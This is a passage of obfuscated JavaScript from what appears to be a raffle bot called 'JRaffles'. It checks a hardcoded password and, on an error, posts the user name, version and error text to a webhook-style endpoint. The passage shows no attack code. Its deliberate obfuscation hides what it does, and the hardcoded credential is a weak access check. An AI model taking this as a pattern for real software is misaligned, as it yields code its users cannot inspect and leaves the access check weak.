                                                                            var _0x1dd059 = await _0x5e68ab();
                                                                            _0x1dd059 == 'ModuleVoorDeBoys' ? (await _0x32aaaf(), await _0x15db06(), await afewFunction(_0x417479[_0x54f8b8], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x54262e(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x3875a0();
        } catch (_0x1f6bd2) {
            return console['log'](_0x1f6bd2), await _0x54262e(0x3a98);
        }
}
;
_0x3feae7('JRaffles\x20' + _0x5c71b0), _0x3f380f();
try {
    _0x42b756();
} catch (_0x37d274) {
    var _0x24fc13 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x2ccb52
            },
            {
                'name': 'Version',
                'value': '' + _0x5c71b0
            },
            {
                'name': 'Error',
                'value': '' + _0x37d274
            }
        ]
    }];
    const _0x16b62e = { 'embeds': _0x24fc13 };
    _0x459a7f(_0x491127, _0x16b62e);
}